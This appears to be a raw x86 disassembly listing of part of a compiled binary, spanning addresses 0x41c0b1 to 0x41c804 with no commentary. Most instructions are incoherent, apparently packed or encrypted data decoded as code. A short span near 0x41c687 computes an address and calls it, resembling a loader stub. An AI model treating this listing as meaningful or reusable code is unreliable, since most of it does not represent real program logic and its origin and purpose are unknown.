  41c0b1:	jo     0x41c05b
  41c0b3:	stc    
  41c0b4:	in     al,0x37
  41c0b6:	jbe    0x41c042
  41c0b8:	int3   
  41c0b9:	lods   eax,DWORD PTR ds:[esi]
  41c0ba:	and    esp,DWORD PTR [eax]
  41c0bc:	retf   0xf814
  41c0bf:	cmp    esp,ebx
  41c0c1:	sub    DWORD PTR [edx],eax
  41c0c3:	or     esi,DWORD PTR [eax]
  41c0c5:	jp     0x41c12a
  41c0c7:	lock pop ebx
  41c0c9:	jnp    0x41c0c2
  41c0cb:	scas   al,BYTE PTR es:[edi]
  41c0cc:	pop    ecx
  41c0cd:	jns    0x41c13a
  41c0cf:	and    esi,0xd6915f18
  41c0d5:	cmp    DWORD PTR [edi],ebx
  41c0d7:	int    0x71
  41c0d9:	mov    eax,0xd0449a7d
  41c0de:	nop
  41c0df:	dec    edi
  41c0e0:	mov    ah,0x5d
  41c0e2:	jg     0x41c0b1
  41c0e4:	sub    esi,eax
  41c0e6:	sub    ah,BYTE PTR [edx+0x2da761c1]
  41c0ec:	mov    dh,0xbf
  41c0ee:	cdq    
  41c0ef:	aaa    
  41c0f0:	dec    ecx
  41c0f1:	mov    ecx,0x44dc3f26
  41c0f6:	out    0x22,eax
  41c0f8:	mov    WORD PTR [ecx+0x3888516d],fs
  41c0fe:	jnp    0x41c14f
  41c100:	repnz (bad) 
  41c102:	adc    BYTE PTR [esi+0x1824fc42],0x19
  41c109:	sbb    al,0xe3
  41c10b:	xchg   esp,eax
  41c10c:	scas   eax,DWORD PTR es:[edi]
  41c10d:	cmc    
  41c10e:	jp     0x41c12c
  41c110:	fcom   st(5)
  41c112:	push   edx
  41c113:	div    BYTE PTR cs:[ebx-0x19aac647]
  41c11a:	dec    esi
  41c11b:	in     al,0xee
  41c11d:	outs   dx,DWORD PTR ds:[esi]
  41c11e:	mov    esi,0x8491ab76
  41c123:	arpl   WORD PTR [edi],dx
  41c125:	arpl   WORD PTR [edx],si
  41c127:	out    dx,eax
  41c128:	outs   dx,DWORD PTR ds:[esi]
  41c129:	cmp    ch,dh
  41c12b:	aaa    
  41c12c:	cmp    dh,BYTE PTR [ecx]
  41c12e:	mov    eax,ds:0x3575369b
  41c133:	mov    edi,0x44310d5e
  41c138:	mov    ebp,0x1e62fa6c
  41c13d:	jb     0x41c0c4
  41c13f:	sub    BYTE PTR [edx-0x10e5e848],0xc
  41c146:	dec    eax
  41c147:	(bad)  
  41c148:	and    esp,DWORD PTR [ebx+ebp*4-0x64]
  41c14c:	cwde   
  41c14d:	mov    ch,0x9c
  41c14f:	add    al,0x4c
  41c151:	std    
  41c152:	inc    eax
  41c153:	mov    BYTE PTR [edx],dh
  41c155:	aam    0xcd
  41c157:	jbe    0x41c0ea
  41c159:	mov    edx,0x8b52c3d5
  41c15e:	test   eax,0x7586c33b
  41c163:	lds    ecx,FWORD PTR [ebx+0x6ceab9fc]
  41c169:	(bad)  
  41c16a:	pop    es
  41c16b:	cmp    DWORD PTR [esi],0xc68f9c87
  41c171:	jge    0x41c15e
  41c173:	cmp    BYTE PTR [ebx+0x68e6bd2b],dl
  41c179:	push   0x668b04fe
  41c17e:	pop    edx
  41c17f:	pop    ebx
  41c180:	repz cmp eax,0xf4291420
  41c186:	push   edx
  41c187:	cld    
  41c188:	stos   DWORD PTR es:[edi],eax
  41c189:	jecxz  0x41c15b
  41c18b:	ret    0xc2fe
  41c18e:	cwde   
  41c18f:	push   esi
  41c190:	and    DWORD PTR [edi+0xfb318d9],esp
  41c196:	(bad)  
  41c197:	push   ss
  41c198:	hlt    
  41c199:	jns    0x41c1f9
  41c19b:	and    al,0xc6
  41c19d:	jae    0x41c205
  41c19f:	dec    edx
  41c1a0:	jno    0xb0fff4a9
  41c1a6:	and    esp,ecx
  41c1a8:	push   es
  41c1a9:	(bad)  
  41c1aa:	push   ds
  41c1ab:	cmp    bh,dh
  41c1ad:	xor    esp,DWORD PTR [edi+0x23]
  41c1b0:	pop    edx
  41c1b1:	sub    BYTE PTR [esi-0x5a],0xff
  41c1b5:	mov    es,WORD PTR [edx+0x5577b471]
  41c1bb:	sbb    DWORD PTR [ecx+0x56],0x123759de
  41c1c2:	dec    esp
  41c1c3:	test   DWORD PTR [ebx+ebx*4-0x56241294],edx
  41c1ca:	ja     0x41c234
  41c1cc:	ret    0x7873
  41c1cf:	(bad)  
  41c1d0:	imul   esi,DWORD PTR [esi+0x1],0xfffffff5
  41c1d4:	test   BYTE PTR [ebp-0x47],ch
  41c1d7:	arpl   ax,bx
  41c1d9:	jno    0x41c186
  41c1db:	mov    ds:0x288770c1,al
  41c1e0:	pop    es
  41c1e1:	fistp  DWORD PTR [edx+0x4a0c1935]
  41c1e7:	xchg   edx,eax
  41c1e8:	xchg   ebx,eax
  41c1e9:	or     DWORD PTR [eax],ecx
  41c1eb:	mov    dl,0x16
  41c1ed:	iret   
  41c1ee:	lahf   
  41c1ef:	push   esp
  41c1f0:	aad    0x41
  41c1f2:	sub    DWORD PTR [esi-0x35],0x7bb227c5
  41c1f9:	push   edi
  41c1fa:	pop    edi
  41c1fb:	loop   0x41c21d
  41c1fd:	fwait
  41c1fe:	hlt    
  41c1ff:	and    al,0x86
  41c201:	in     eax,0x16
  41c203:	int3   
  41c204:	jnp    0x41c278
  41c206:	sahf   
  41c207:	out    0x27,eax
  41c209:	dec    esi
  41c20a:	rol    DWORD PTR [edi],1
  41c20c:	pop    esp
  41c20d:	jmp    0x41c1e1
  41c20f:	push   cs
  41c210:	into   
  41c211:	push   ebx
  41c212:	fidiv  WORD PTR ds:0x7510850
  41c218:	add    eax,ebx
  41c21a:	jmp    0x41c44f
  41c21f:	cmp    al,0xc7
  41c221:	(bad)
  41c224:	rol    esp,0xc5
  41c227:	jb     0x41c1ac
  41c229:	dec    ebx
  41c22a:	pop    ebx
  41c22b:	pop    eax
  41c22c:	ret    0xe328
  41c22f:	push   eax
  41c230:	out    dx,al
  41c231:	jg     0x41c2ab
  41c233:	adc    BYTE PTR [esi+0x78],bh
  41c236:	js     0x41c295
  41c238:	dec    esi
  41c239:	jg     0x41c2a0
  41c23b:	mov    edi,edx
  41c23d:	test   BYTE PTR [ebx-0x37be8421],ch
  41c243:	adc    al,dl
  41c245:	pop    ss
  41c246:	dec    ebp
  41c247:	in     eax,0x7
  41c249:	scas   eax,DWORD PTR es:[edi]
  41c24a:	mov    edi,0xc1d34bb3
  41c24f:	jo     0x41c1ec
  41c251:	add    al,0x7d
  41c253:	paddusb mm2,QWORD PTR [edi+0x5831ea05]
  41c25a:	inc    edi
  41c25b:	mov    eax,ds:0x25bfc606
  41c260:	hlt    
  41c261:	or     DWORD PTR [ecx],edi
  41c263:	sub    DWORD PTR [esi-0x2e892f87],ebp
  41c269:	and    DWORD PTR [ecx],eax
  41c26b:	pop    esp
  41c26c:	push   eax
  41c26d:	and    BYTE PTR [esp+ebx*4-0x650e6744],dl
  41c274:	jb     0x41c207
  41c276:	cmp    BYTE PTR [ebx-0x73798706],0xc1
  41c27d:	jecxz  0x41c271
  41c27f:	data16 adc al,0xb8
  41c282:	cmp    edx,DWORD PTR [ebx+0x30]
  41c285:	leave  
  41c286:	imul   ebp,eax,0xffffffd7
  41c289:	mov    ch,0x85
  41c28b:	dec    esi
  41c28c:	outs   dx,DWORD PTR ds:[esi]
  41c28d:	xor    al,0x3e
  41c28f:	cdq    
  41c290:	adc    esp,ebx
  41c292:	mov    es:0x78daa6a4,al
  41c298:	pop    ss
  41c299:	xchg   esi,eax
  41c29a:	jae    0x41c27d
  41c29c:	mov    ds:0xa6f366c4,eax
  41c2a1:	(bad)  
  41c2a2:	mov    dh,0xb2
  41c2a4:	jb     0x41c2a5
  41c2a6:	in     al,0xe
  41c2a8:	fstp   DWORD PTR [ebx+0x63079e06]
  41c2ae:	inc    edx
  41c2af:	dec    ebx
  41c2b0:	sti    
  41c2b1:	or     bl,ah
  41c2b3:	retf   
  41c2b4:	mov    al,0xa2
  41c2b6:	loop   0x41c279
  41c2b8:	cmp    DWORD PTR [edi+0x4f812fbd],ebp
  41c2be:	aas    
  41c2bf:	sub    ebx,DWORD PTR [esi+0x54]
  41c2c2:	pop    esp
  41c2c3:	mov    bh,0x79
  41c2c5:	dec    esi
  41c2c6:	(bad)  [esi-0x1cd5b4db]
  41c2cc:	lahf   
  41c2cd:	pop    edx
  41c2ce:	retf   
  41c2cf:	adc    al,0xe8
  41c2d1:	cs int3 
  41c2d3:	fist   WORD PTR [edx-0x20]
  41c2d6:	adc    al,BYTE PTR [esi+0x156cd4a1]
  41c2dc:	adc    ah,al
  41c2de:	jno    0x41c2a7
  41c2e0:	daa    
  41c2e1:	pop    ebx
  41c2e2:	and    bl,cl
  41c2e4:	(bad)  
  41c2e5:	mov    WORD PTR [edi+0x4e325710],ss
  41c2eb:	addr16 rol edx,1
  41c2ee:	cmp    ah,BYTE PTR [esi-0x2f]
  41c2f1:	nop
  41c2f2:	sbb    bl,0x32
  41c2f5:	std    
  41c2f6:	shrd   DWORD PTR [edx-0x8e1d20e],ebx,0xe8
  41c2fe:	scas   al,BYTE PTR es:[edi]
  41c2ff:	fild   WORD PTR ds:0x9ac17b6c
  41c305:	pop    ebp
  41c306:	push   ds
  41c307:	mov    eax,0xf0224bea
  41c30c:	mov    ds:0xc9b6689d,al
  41c311:	aad    0xda
  41c313:	(bad)  
  41c316:	push   ebp
  41c317:	cmp    esi,DWORD PTR [edx+ebx*8]
  41c31a:	mov    ebx,0xea25c98e
  41c31f:	or     eax,0x8e7a5211
  41c324:	mov    esp,0x9c197d61
  41c329:	jmp    FWORD PTR [ecx+0x10baa32f]
  41c32f:	hlt    
  41c330:	jle    0x41c327
  41c332:	rol    DWORD PTR [esi-0xe24e013],cl
  41c338:	out    0xe,al
  41c33a:	ds mov bl,0xe2
  41c33d:	ins    DWORD PTR es:[edi],dx
  41c33e:	fcomp  DWORD PTR [edi]
  41c340:	(bad)  [esi+0x5]
  41c343:	mov    ah,0x63
  41c345:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c346:	xchg   ecx,eax
  41c347:	jnp    0x41c2e1
  41c349:	mov    BYTE PTR [edi+0x61210931],dl
  41c34f:	push   esp
  41c350:	xchg   ebx,eax
  41c351:	mov    edi,0xa3df8f77
  41c356:	jno    0x41c397
  41c358:	les    esi,FWORD PTR [eiz*1+0x35330d75]
  41c35f:	cli    
  41c360:	sub    ebp,DWORD PTR [edi]
  41c362:	inc    ebx
  41c363:	loopne 0x41c349
  41c365:	pop    ebp
  41c366:	retf   
  41c367:	pop    ds
  41c368:	sbb    al,0xc1
  41c36a:	imul   ecx,DWORD PTR [edx-0x15d5235f],0x763c884d
  41c374:	push   es
  41c375:	sbb    edi,edx
  41c377:	js     0x41c399
  41c379:	jmp    0x41c3df
  41c37b:	xchg   ecx,eax
  41c37c:	outs   dx,BYTE PTR ds:[esi]
  41c37d:	test   eax,0x7cab5a4
  41c382:	pop    edx
  41c383:	int3   
  41c384:	lock shl cl,0x4
  41c388:	push   edx
  41c389:	popa   
  41c38a:	daa    
  41c38b:	and    al,0x44
  41c38d:	sbb    cl,0xb3
  41c390:	cwde   
  41c391:	jo     0x41c3bb
  41c393:	sbb    edx,DWORD PTR [ecx+edx*2]
  41c396:	cli    
  41c397:	xchg   edx,eax
  41c398:	pusha  
  41c399:	inc    DWORD PTR [edx+0x6a]
  41c39c:	and    eax,0xa4f3c61e
  41c3a1:	jo     0x41c324
  41c3a3:	mov    bl,0x5f
  41c3a5:	jmp    0x3288e43e
  41c3aa:	inc    esi
  41c3ab:	pop    eax
  41c3ac:	(bad)  
  41c3ad:	xor    al,0x4
  41c3af:	pop    ebp
  41c3b0:	cli    
  41c3b1:	jae    0x41c3c1
  41c3b3:	enter  0xf350,0x1
  41c3b7:	aam    0x17
  41c3b9:	push   es
  41c3ba:	sbb    DWORD PTR [eax+0x1fcf1168],ecx
  41c3c0:	call   DWORD PTR [edi+0x1b]
  41c3c3:	push   eax
  41c3c4:	add    eax,0x3d7832e8
  41c3c9:	sbb    BYTE PTR ds:0x96c8a012,ah
  41c3cf:	cld    
  41c3d0:	pop    ecx
  41c3d1:	adc    cl,BYTE PTR [ebx]
  41c3d3:	cmp    DWORD PTR [esi+0xf77ad33],edi
  41c3d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3da:	xchg   edx,eax
  41c3db:	das    
  41c3dc:	gs dec esi
  41c3de:	aam    0xe4
  41c3e0:	scas   al,BYTE PTR es:[edi]
  41c3e1:	xor    ecx,DWORD PTR [ecx-0x41]
  41c3e4:	mov    ds:0x61c8757e,eax
  41c3e9:	dec    esi
  41c3ea:	retf   
  41c3eb:	add    dl,BYTE PTR [ecx+0x32]
  41c3ee:	popf   
  41c3ef:	jns    0x41c39c
  41c3f1:	xor    eax,0xca6a0eb9
  41c3f6:	scas   al,BYTE PTR es:[edi]
  41c3f7:	ret    0x64dd
  41c3fa:	mov    eax,ds:0xa312fa0e
  41c3ff:	push   cs
  41c400:	loop   0x41c416
  41c402:	jmp    0xe5d:0xfc0fc681
  41c409:	push   esp
  41c40a:	mov    dh,0x14
  41c40c:	jg     0x41c3d5
  41c40e:	or     DWORD PTR [ebx+0x77],0xf2842590
  41c415:	sub    dl,BYTE PTR [esi-0x14cdf132]
  41c41b:	lock add esi,esi
  41c41e:	ins    DWORD PTR es:[edi],dx
  41c41f:	ja     0x41c3b5
  41c421:	(bad)  
  41c423:	popf   
  41c424:	pop    ebp
  41c425:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c426:	and    al,BYTE PTR [esi+0x1f46b443]
  41c42c:	add    bh,BYTE PTR [esi+0x694aef6e]
  41c432:	arpl   WORD PTR [edi],cx
  41c434:	sahf   
  41c435:	lea    eax,[esi+0x52]
  41c438:	div    DWORD PTR [eax-0x64]
  41c43b:	popf   
  41c43c:	iret   
  41c43d:	xchg   edi,eax
  41c43e:	and    DWORD PTR [eax-0x6f6450bd],edi
  41c444:	dec    esp
  41c445:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c446:	outs   dx,BYTE PTR ds:[esi]
  41c447:	cmc    
  41c448:	mov    ebp,DWORD PTR [edx+0x27]
  41c44b:	addr16 int3 
  41c44d:	adc    ch,dl
  41c44f:	mov    DWORD PTR [ebp-0xc],eax
  41c452:	jmp    0x41c687
  41c457:	rol    dl,1
  41c459:	(bad)  
  41c45a:	enter  0xd6da,0xd4
  41c45e:	retf   0xb6a7
  41c461:	pop    eax
  41c462:	jp     0x41c444
  41c464:	jecxz  0x41c4a2
  41c466:	dec    edx
  41c467:	push   0x10787fec
  41c46c:	jle    0x41c4e6
  41c46e:	js     0x41c4dd
  41c470:	sbb    al,0x63
  41c472:	leave  
  41c473:	cmp    al,0x91
  41c475:	push   ebx
  41c476:	xor    BYTE PTR [eax+0xd],bh
  41c479:	adc    DWORD PTR [edx],edi
  41c47b:	(bad)  
  41c47c:	ins    DWORD PTR es:[edi],dx
  41c47d:	ins    BYTE PTR es:[edi],dx
  41c47e:	jns    0x41c4bc
  41c480:	inc    ebx
  41c481:	xchg   edx,eax
  41c482:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c484:	ins    BYTE PTR es:[edi],dx
  41c485:	ret    0xd97e
  41c488:	sub    eax,0x8e0d054c
  41c48d:	jmp    0x108e:0x3c8ce469
  41c494:	mov    edx,0xde545fdc
  41c499:	cmp    DWORD PTR [edi-0x32f26b5e],eax
  41c49f:	mov    ds:0x9b3480bf,eax
  41c4a4:	mov    edx,0x8b531e9c
  41c4a9:	xor    BYTE PTR [eax],0x47
  41c4ac:	jb     0x41c44c
  41c4ae:	arpl   WORD PTR [ebx],cx
  41c4b0:	scas   al,BYTE PTR es:[edi]
  41c4b1:	add    esi,DWORD PTR [esi+esi*8+0x29156281]
  41c4b8:	jae    0x41c528
  41c4ba:	test   DWORD PTR [ebx+0x52d0b91c],0xb8c60e59
  41c4c4:	out    dx,al
  41c4c5:	mov    BYTE PTR [esi+0x17],0xa8
  41c4c9:	fldenv [eax]
  41c4cb:	mov    edi,0xea0d7e17
  41c4d0:	mov    dl,0xa6
  41c4d2:	pusha  
  41c4d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4d5:	popf   
  41c4d6:	mov    edi,0x18f0092c
  41c4db:	lods   al,BYTE PTR ds:[esi]
  41c4dc:	dec    esp
  41c4dd:	jge    0x41c520
  41c4df:	xor    BYTE PTR [ebp+0x4ea4dcc9],bh
  41c4e5:	jmp    0xf41daa9d
  41c4ea:	mov    bl,0x89
  41c4ec:	pop    es
  41c4ed:	jmp    0x41c52a
  41c4ef:	jmp    0x41c4d0
  41c4f1:	call   0x39da:0x36d812c1
  41c4f8:	xchg   ebx,eax
  41c4f9:	cmp    esp,edi
  41c4fb:	repnz aaa 
  41c4fd:	sub    DWORD PTR [ecx+eax*8],esi
  41c500:	mov    ds:0x79312dc4,eax
  41c505:	jecxz  0x41c549
  41c507:	or     BYTE PTR [ecx+0x4],al
  41c50a:	test   al,0xdf
  41c50c:	lods   eax,DWORD PTR ds:[esi]
  41c50d:	in     al,dx
  41c50e:	rcr    DWORD PTR [ebp-0x1d],0x58
  41c512:	jle    0x41c50c
  41c514:	cmp    eax,0xe7f02678
  41c519:	(bad)  
  41c51a:	cmp    bh,BYTE PTR [ecx+0x23]
  41c51d:	mov    cl,0xbe
  41c51f:	fwait
  41c520:	(bad)  
  41c521:	sbb    al,0x8f
  41c523:	loop   0x41c4df
  41c525:	cmp    esp,eax
  41c527:	or     DWORD PTR [edi+0x66],edx
  41c52a:	or     DWORD PTR [edx+0x5a],edx
  41c52d:	mov    DWORD PTR [ebx],ebx
  41c52f:	dec    esp
  41c530:	push   0x1d1561ad
  41c535:	jmp    0x41c547
  41c537:	push   cs
  41c538:	jne    0x41c51d
  41c53a:	or     DWORD PTR [edx+eax*4+0x45],0xfffffffc
  41c53f:	dec    ecx
  41c540:	out    dx,al
  41c541:	addr16 (bad) 
  41c543:	mov    al,0xf2
  41c545:	into   
  41c546:	stos   BYTE PTR es:[edi],al
  41c547:	or     eax,0xf75717ea
  41c54c:	fs push ds
  41c54e:	push   es
  41c54f:	push   ebx
  41c550:	loopne 0x41c583
  41c552:	push   ss
  41c553:	shl    DWORD PTR [edx+0x8f99720],cl
  41c559:	mov    edx,0x451e695b
  41c55e:	adc    al,0x2a
  41c560:	loop   0x41c54c
  41c562:	jb     0x41c504
  41c564:	cmpxchg BYTE PTR [esi+0x43],dl
  41c568:	in     al,0x10
  41c56a:	mov    ah,0x9d
  41c56c:	rcr    DWORD PTR [edi+esi*1-0x62f0ce04],cl
  41c573:	mov    ecx,0x9769188d
  41c578:	inc    esi
  41c579:	ss ret 0x1b4c
  41c57d:	jmp    0x41c54a
  41c57f:	iret   
  41c580:	jg     0x41c5c1
  41c582:	or     al,0xbf
  41c584:	out    0x47,eax
  41c586:	ins    DWORD PTR es:[edi],dx
  41c587:	pop    eax
  41c588:	nop    esp
  41c58b:	jmp    0xbdfac9de
  41c590:	enter  0xc38c,0x54
  41c594:	cli    
  41c595:	call   0x56b6:0x364c4f33
  41c59c:	inc    edx
  41c59d:	xor    esi,DWORD PTR [ecx+esi*2]
  41c5a0:	popa   
  41c5a1:	xor    ch,BYTE PTR [edx]
  41c5a3:	mov    eax,ds:0xf0b08953
  41c5a8:	mov    BYTE PTR ds:0x298ef4e,al
  41c5ae:	in     al,dx
  41c5af:	xchg   ebx,eax
  41c5b0:	inc    edx
  41c5b1:	outs   dx,BYTE PTR ds:[esi]
  41c5b2:	jnp    0x41c61d
  41c5b4:	jbe    0x41c5cc
  41c5b6:	pop    edi
  41c5b7:	fbstp  TBYTE PTR [esi]
  41c5b9:	jae    0x41c624
  41c5bb:	jecxz  0x41c549
  41c5bd:	pop    es
  41c5be:	pop    edx
  41c5bf:	sbb    ebx,DWORD PTR [esi+0x62]
  41c5c2:	cwde   
  41c5c3:	sub    al,0x30
  41c5c5:	mov    dl,0xaf
  41c5c7:	fadd   DWORD PTR [ecx-0x7e8d1e76]
  41c5cd:	imul   ecx,DWORD PTR [esi-0x7f9a232d],0xced8bd5c
  41c5d7:	xchg   ebx,eax
  41c5d8:	and    DWORD PTR ds:0x8b23e3ab,ecx
  41c5de:	inc    eax
  41c5df:	jle    0x41c58b
  41c5e1:	idiv   BYTE PTR [edi+0x4b]
  41c5e4:	mov    ecx,0x97de30f2
  41c5e9:	jmp    0xc7d5e1f8
  41c5ee:	push   edi
  41c5ef:	std    
  41c5f0:	push   ds
  41c5f1:	mov    dl,0xba
  41c5f3:	mov    cl,0x19
  41c5f5:	scas   eax,DWORD PTR es:[edi]
  41c5f6:	and    ch,BYTE PTR [edx-0x5c]
  41c5f9:	(bad)  [ebp-0x3a]
  41c5fc:	pop    ss
  41c5fd:	es inc edx
  41c5ff:	test   DWORD PTR [ebx*1-0x51b7815],ecx
  41c606:	addr16 pop ss
  41c608:	xchg   edi,eax
  41c609:	mov    bh,0x85
  41c60b:	jp     0x41c66b
  41c60d:	add    DWORD PTR [ebp-0x52],0xffffffb4
  41c611:	fidivr DWORD PTR [edx]
  41c613:	mov    ebx,0x56f0e640
  41c618:	sbb    DWORD PTR [ecx+0x5d61ed26],edi
  41c61e:	jle    0x41c63e
  41c620:	cdq    
  41c621:	mov    al,0xc4
  41c623:	and    DWORD PTR [edx+0x37],ebx
  41c626:	vpmadcswd ymm1,ymm1,ymm1,YMMWORD PTR [edx+0x63]
  41c62d:	div    bl
  41c62f:	js     0x41c65d
  41c631:	or     ch,BYTE PTR ss:[ebx-0x65]
  41c635:	stos   BYTE PTR es:[edi],al
  41c636:	loope  0x41c6b7
  41c638:	and    eax,0xf9d437dd
  41c63d:	pop    ds
  41c63e:	arpl   WORD PTR es:[ebp+0xc6649a4],bx
  41c645:	(bad)  
  41c646:	xlat   BYTE PTR ds:[ebx]
  41c647:	or     al,0x3
  41c649:	lock (bad) 
  41c64b:	lock mov ds:0xac4e270b,al
  41c651:	mov    eax,0x85bf18e8
  41c656:	mov    DWORD PTR [eax+0x32],esp
  41c659:	test   eax,0xd5136111
  41c65e:	cmp    al,0x4a
  41c660:	fwait
  41c661:	mov    ds:0x9d353aae,al
  41c666:	sub    BYTE PTR [esi-0x5633c56c],0x78
  41c66d:	ret    0xee00
  41c670:	stos   DWORD PTR es:[edi],eax
  41c671:	pop    ds
  41c672:	dec    eax
  41c673:	jp     0x41c600
  41c675:	pop    ecx
  41c676:	repz mov edi,0xbd307985
  41c67c:	dec    ecx
  41c67d:	add    BYTE PTR [ecx+0x3c],0xc7
  41c681:	ret    
  41c682:	xchg   esi,eax
  41c683:	rcr    DWORD PTR [eax],1
  41c685:	mov    cl,0xb3
  41c687:	xor    ebx,ebx
  41c689:	lea    eax,[ebp-0x10]
  41c68c:	add    ebx,DWORD PTR [eax]
  41c68e:	call   ebx
  41c690:	xor    ebx,ebx
  41c692:	inc    ebx
  41c693:	cmp    DWORD PTR [ebp+0x10],ebx
  41c696:	je     0x41c6b4
  41c69c:	xchg   edx,eax
  41c69d:	push   0xa
  41c69f:	pop    ecx
  41c6a0:	push   0x4
  41c6a2:	pop    ebx
  41c6a3:	inc    ebx
  41c6a4:	xchg   ebx,ecx
  41c6a6:	sub    ebx,ecx
  41c6a8:	xchg   ebx,ecx
  41c6aa:	dec    ecx
  41c6ab:	mov    eax,DWORD PTR [ebp-0x1c]
  41c6ae:	imul   eax,ecx
  41c6b1:	add    esp,eax
  41c6b3:	xchg   edx,eax
  41c6b4:	push   eax
  41c6b5:	xor    ebx,ebx
  41c6b7:	mov    edx,esp
  41c6b9:	jmp    0x41c8ee
  41c6be:	mov    bh,0xc9
  41c6c1:	iret   
  41c6c2:	leave  
  41c6c3:	rcr    edx,1
  41c6c5:	aad    0x5d
  41c6c7:	mov    ds:0x79fd773e,eax
  41c6cc:	mov    ecx,DWORD PTR [edi]
  41c6ce:	add    cl,dh
  41c6d0:	jg     0x41c74a
  41c6d2:	adc    BYTE PTR [esi+0x78],bh
  41c6d5:	js     0x41c717
  41c6d7:	cli    
  41c6d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6d9:	fwait
  41c6da:	push   ebp
  41c6db:	mov    ecx,0x480ae8f3
  41c6e0:	in     eax,dx
  41c6e1:	pop    ebx
  41c6e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6e3:	sub    BYTE PTR [ecx-0x14],al
  41c6e6:	dec    esp
  41c6e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6e8:	sub    DWORD PTR [ebx-0x6],ebx
  41c6eb:	(bad)  
  41c6ec:	pop    ebx
  41c6ed:	int    0xae
  41c6ef:	push   eax
  41c6f0:	loop   0x41c676
  41c6f2:	xchg   DWORD PTR [edx],edi
  41c6f4:	cs stc 
  41c6f6:	call   DWORD PTR [eax]
  41c6f8:	retf   0x7f7d
  41c6fb:	ret    
  41c6fc:	ss mov bh,0x2c
  41c6ff:	iret   
  41c700:	add    BYTE PTR [edi],dl
  41c702:	pop    ebx
  41c703:	out    0x3d,eax
  41c705:	and    dh,BYTE PTR [edx+0x1d44693d]
  41c70b:	xchg   ebx,eax
  41c70c:	les    esp,FWORD PTR [eax]
  41c70e:	inc    edi
  41c70f:	push   ds
  41c710:	lods   al,BYTE PTR ds:[esi]
  41c711:	jno    0x41c6a9
  41c713:	dec    BYTE PTR [ecx+0x4]
  41c716:	add    eax,0x31c67b8b
  41c71b:	out    0xc5,al
  41c71d:	fs mov ch,0x36
  41c720:	lahf   
  41c721:	into   
  41c722:	(bad)  
  41c723:	jns    0x41c6d6
  41c725:	aaa    
  41c726:	add    DWORD PTR [edx+0x1f],ecx
  41c729:	inc    esp
  41c72a:	jmp    0x47fa54a4
  41c72f:	jb     0x41c703
  41c731:	pop    edx
  41c732:	pop    edi
  41c733:	xor    DWORD PTR [edi-0x17],edx
  41c736:	dec    eax
  41c737:	div    DWORD PTR [ecx]
  41c739:	mov    ebx,0x1a582fb9
  41c73e:	pop    ecx
  41c73f:	imul   edi,esi,0x85f947a9
  41c745:	ins    DWORD PTR es:[edi],dx
  41c746:	inc    ebp
  41c747:	dec    ecx
  41c748:	mov    dh,0x96
  41c74a:	jp     0x41c7c5
  41c74c:	sub    DWORD PTR [ebx],edi
  41c74e:	lods   eax,DWORD PTR ds:[esi]
  41c74f:	push   cs
  41c750:	add    ah,BYTE PTR [ebx+edx*1-0x6d]
  41c754:	ds adc al,0x52
  41c757:	push   ebx
  41c758:	adc    eax,edx
  41c75a:	push   edi
  41c75b:	sub    edi,ebp
  41c75d:	mov    edi,0x25ca48dc
  41c762:	ja     0x41c758
  41c764:	scas   al,BYTE PTR es:[edi]
  41c765:	shl    ebx,0xdd
  41c768:	lods   al,BYTE PTR ds:[esi]
  41c769:	loop   0x41c6f0
  41c76b:	xchg   DWORD PTR [edx+0x23f2dfe4],eax
  41c771:	xor    dl,BYTE PTR [esi+0x28deea6]
  41c777:	cmc    
  41c778:	cwde   
  41c779:	(bad)  
  41c77a:	in     eax,0x96
  41c77c:	loope  0x41c7b7
  41c77e:	pop    esp
  41c77f:	cmp    esp,DWORD PTR [eax+0x42]
  41c782:	(bad)  
  41c783:	icebp  
  41c784:	not    BYTE PTR [edi+0x54]
  41c787:	bound  edi,QWORD PTR [ebx-0x57]
  41c78a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c78b:	cmp    dh,BYTE PTR [ecx]
  41c78d:	dec    esp
  41c78e:	add    edi,DWORD PTR [ecx+0x53]
  41c791:	sub    DWORD PTR ds:0x7154f546,0x7b2d6638
  41c79b:	mov    ds:0xee81413f,eax
  41c7a0:	call   0xbf5c69ca
  41c7a5:	xlat   BYTE PTR ds:[ebx]
  41c7a6:	cwde   
  41c7a7:	nop
  41c7a8:	and    eax,0x756c6360
  41c7ad:	jmp    0x41c81e
  41c7af:	out    dx,al
  41c7b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7b1:	call   0x4a7e:0x8ee403b6
  41c7b8:	fwait
  41c7b9:	sub    dl,bh
  41c7bb:	or     ecx,DWORD PTR [edi]
  41c7bd:	xor    al,0xd4
  41c7bf:	jp     0x41c784
  41c7c1:	push   ebp
  41c7c2:	repnz stos BYTE PTR es:[edi],al
  41c7c4:	xchg   esp,eax
  41c7c5:	inc    ecx
  41c7c6:	mov    ch,0xf6
  41c7c8:	sub    eax,0x99185a3a
  41c7cd:	jns    0x41c778
  41c7cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7d0:	mov    dl,0x7c
  41c7d2:	sti    
  41c7d3:	pop    edi
  41c7d4:	sahf   
  41c7d5:	icebp  
  41c7d6:	or     DWORD PTR [esp+eax*1],0x2a
  41c7da:	fistp  WORD PTR ds:0x3a29cb1
  41c7e0:	out    dx,al
  41c7e1:	sbb    al,0x54
  41c7e3:	inc    esp
  41c7e4:	cld    
  41c7e5:	or     al,0x2
  41c7e7:	xor    DWORD PTR [esi],ebx
  41c7e9:	inc    ebx
  41c7ea:	and    al,0xa5
  41c7ec:	in     eax,dx
  41c7ed:	shr    BYTE PTR [esp+esi*1],0x3a
  41c7f1:	arpl   WORD PTR [edi],bp
  41c7f3:	clc    
  41c7f4:	mov    bh,BYTE PTR [ebx-0x4d]
  41c7f7:	or     al,0x34
  41c7f9:	repnz mul DWORD PTR [eax]
  41c7fc:	jae    0x41c78b
  41c7fe:	(bad)  [ebx+0x52a7b620]
  41c804:	or     al,0x75
